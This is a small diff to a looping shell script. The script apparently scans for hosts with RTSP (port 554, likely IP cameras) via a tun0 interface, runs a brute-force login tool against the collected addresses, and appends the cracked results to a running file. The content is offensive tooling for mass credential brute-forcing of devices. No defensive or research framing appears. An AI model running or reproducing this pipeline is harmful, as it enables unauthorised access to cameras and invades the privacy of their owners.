@@ -2,12 +2,12 @@
 while true; do
     echo
     echo Gather IPs
-    ./fortune_port.py 554 -w 1024 -F -i tun0
+    ./fortune_rtsp.py 554 -c 7 -w 1024 -F -i tun0
 
     echo
     echo Brute
-    ./rtsp_brute_simple.py \
-        -w 1024 -i tun0 -sp > local/bruted.txt
+    ./rtsp_brute_simple.py local/rtsp_554.txt \
+        -i tun0 -sp > local/bruted.txt
     cat local/bruted.txt >> local/rtsp.txt
 
     echo
